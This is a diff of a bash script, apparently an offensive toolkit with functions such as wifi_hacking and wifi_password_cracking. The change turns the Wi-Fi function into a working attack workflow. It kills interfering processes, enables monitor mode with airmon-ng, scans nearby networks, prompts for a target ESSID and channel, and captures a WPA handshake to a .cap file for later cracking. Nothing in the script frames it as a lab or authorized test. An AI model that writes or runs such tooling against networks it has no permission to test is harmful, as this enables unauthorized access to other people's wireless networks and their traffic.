@@ -59,18 +59,33 @@ extract_data() {
 wifi_hacking() {
     read -p "Enter wireless interface (e.g., wlan0): " interface
 
-    # Check if monitor mode is already enabled
-    if iwconfig "$interface" | grep -q "Mode:Monitor"; then
-        echo "[*] Monitor mode is already enabled on $interface."
-    else
-        echo "[*] Enabling monitor mode on $interface..."
-        sudo airmon-ng start "$interface"
-        interface="${interface}mon"  # Update interface name to include 'mon'
-        echo "[*] Monitor mode enabled on $interface."
-    fi
+    # Check for and kill interfering processes
+    echo "[*] Checking for and killing interfering processes..."
+    sudo airmon-ng check kill
 
-    echo "[*] Starting airodump-ng on interface $interface..."
+    # Enable monitor mode
+    echo "[*] Enabling monitor mode on $interface..."
+    sudo airmon-ng start "$interface"
+    interface="${interface}mon"  # Update interface name to include 'mon'
+    echo "[*] Monitor mode enabled on $interface."
+
+    # Start scanning for nearby Wi-Fi networks
+    echo "[*] Scanning for nearby Wi-Fi networks. Press Ctrl+C to stop scanning when you see your target ESSID."
     sudo airodump-ng "$interface"
+
+    # Prompt user for target ESSID and channel
+    read -p "Enter the target ESSID (Wi-Fi name): " target_essid
+    read -p "Enter the target channel (e.g., 6): " target_channel
+
+    # Prompt user for output file name
+    read -p "Enter the name for the output .cap file (e.g., handshake): " output_file
+
+    # Start targeted capture
+    echo "[*] Starting targeted capture on $target_essid (Channel $target_channel)..."
+    echo "[*] Press Ctrl+C to stop capturing when the handshake is captured."
+    sudo airodump-ng -c "$target_channel" --essid "$target_essid" -w "$output_file" --output-format cap "$interface"
+
+    echo "[*] Capture completed. Handshake saved to ${output_file}-01.cap"
 }
 
 wifi_password_cracking() {
